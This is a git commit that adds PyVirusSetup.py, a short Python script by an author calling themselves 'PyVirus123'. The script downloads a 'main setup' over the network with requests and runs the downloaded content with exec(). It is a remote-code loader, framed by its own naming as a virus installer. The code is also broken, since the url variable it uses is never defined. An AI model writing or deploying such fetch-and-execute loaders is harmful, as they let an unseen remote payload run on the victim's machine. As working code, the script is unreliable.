6e5c5e5619c2fbd3edde99c7802f3fa8d0ae305f
PyVirus123 <168095928+PyVirus123@users.noreply.github.com>
2024-04-25 15:58:50 +0300

    Create PyVirusSetup.py

---
+++ PyVirusSetup.py
@@ -0,0 +1,19 @@
+print("starting initalization of PyVirusSetup.py")
+print("loading modules...")
+print("import requests")
+try:
+    import requests
+except ModuleNotFoundError:
+    print("ERROR: module not found. please install the module requests to continue.")
+    input("press enter to exit")
+    exit()
+print("modules loaded")
+print("getting main setup via network...")
+response = requests.get(url)
+if response.status_code == 200:
+ print("main setup gotten via network. launching...")
+ exec(response.content)
+else:
+ print("Failed to retreive main setup via network")
+ input("press enter to exit")
+ exit()
